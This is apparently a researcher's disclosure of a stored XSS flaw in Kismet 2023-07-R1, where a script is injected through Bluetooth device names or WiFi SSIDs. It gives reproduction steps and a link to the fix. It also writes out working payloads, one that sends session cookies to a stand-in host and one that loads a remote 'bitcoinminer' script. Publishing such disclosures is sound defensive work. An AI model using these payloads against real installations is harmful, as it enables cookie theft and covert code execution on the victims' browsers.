# Kismet_XSS_2023-07-R1

I discovered a minor XSS vulnerability in Kismet 2023-07-R1. Allows user to inject script from device names.

Bluetooth device names, and WIFI SSID can be set to arbitrary user input. 
 * WIFI SSID only gives you 32 characters to play with.
 * Bluetooth gives approx 248 bytes? https://stackoverflow.com/a/65577574

Reproduce:
1. run Kismet 2023-07-R1
2. set Bluetooth device name, or SSID to `<script>alert('xss')</script>`
3. script will execute once Kismet finds device.


Bluetooth Device name example:
-
![](screenshots/BluetoothDeviceName_20250327-060307.png)
![](screenshots/Bluetooth_XSS_20250327_060520.png)

WIFI SSID example:
-
![](screenshots/WIFI_SSID_20250327_101926.png)
![](screenshots/WIFI_XSS_20250327102242.png)


Cookie can be extracted via: `<script>alert(document.cookie)</script>` or `<script>location='http://example.com/?c='+document.cookie;</script>`
![](screenshots/cookie_xss_20250327063902.png)

I don't think its super useful? But it's enough characters to load a remote script. eg: `<script src=//example.com/bitcoinminer.js>`

Fixed: https://github.com/kismetwireless/kismet/commit/9d0821fc90fc5fa3b0dcc9000da49bacdea433ea

Be sure to upgrade to 2023-07-R2!
